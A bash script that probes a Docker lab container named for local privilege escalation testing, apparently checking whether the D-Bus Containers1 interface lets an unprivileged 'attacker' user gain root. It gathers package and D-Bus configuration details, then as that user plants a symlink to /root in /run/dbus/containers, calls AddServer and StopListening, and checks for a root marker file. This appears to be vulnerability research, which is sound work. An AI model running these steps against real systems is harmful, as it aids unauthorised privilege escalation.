#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/dbus-containers1.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s >"$log" 2>&1 <<'EOS'
set -euo pipefail

marker=/root/dbus_containers1_root
rm -f "$marker" /tmp/dbus_containers1_* 2>/dev/null || true

echo "D-Bus Containers1 runtime probe"
date --iso-8601=seconds
echo

echo "## target/default proof"
sed -n '1,8p' /etc/os-release
uname -a
id attacker
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  dbus dbus-daemon systemd polkitd 2>&1 | sort
systemctl is-active dbus.service dbus.socket 2>&1 || true
stat -c '%A %a %U:%G %F %n' /run/dbus /run/dbus/system_bus_socket /run/dbus/containers 2>&1 || true
echo

echo "## default config paths"
nl -ba /usr/lib/tmpfiles.d/dbus.conf | sed -n '1,20p'
nl -ba /usr/share/dbus-1/system.conf | sed -n '65,80p'
echo

echo "## runtime D-Bus interfaces"
busctl --system get-property org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus Interfaces 2>&1 || true
busctl --system get-property org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus Features 2>&1 || true
busctl --system introspect org.freedesktop.DBus /org/freedesktop/DBus --no-pager 2>&1 | sed -n '1,120p'
echo

echo "## attacker directory and method attempts"
runuser -u attacker -- sh -lc '
set +e
id
touch /run/dbus/containers/dbus_containers1_touch 2>&1
echo touch_rc=$?
ln -s /root/dbus_containers1_root /run/dbus/containers/dbus_containers1_link 2>&1
echo symlink_rc=$?
busctl --system call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.Containers1 AddServer ssa{sv} "unix:tmpdir=/run/dbus/containers" com.example.Container 0 2>&1
echo addserver_rc=$?
busctl --system call org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.Containers1 StopListening o /org/freedesktop/DBus/Containers1/attacker 2>&1
echo stoplistening_rc=$?
' || true
echo

echo "## postcheck"
find /run/dbus/containers -maxdepth 1 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort
ls -l "$marker" /tmp/dbus_containers1_* 2>&1 || true
echo "ROOT_PROOF=$(test -e "$marker" && echo yes || echo no)"
systemctl is-system-running
systemctl --failed --no-legend | wc -l
EOS

echo "log written to $log"
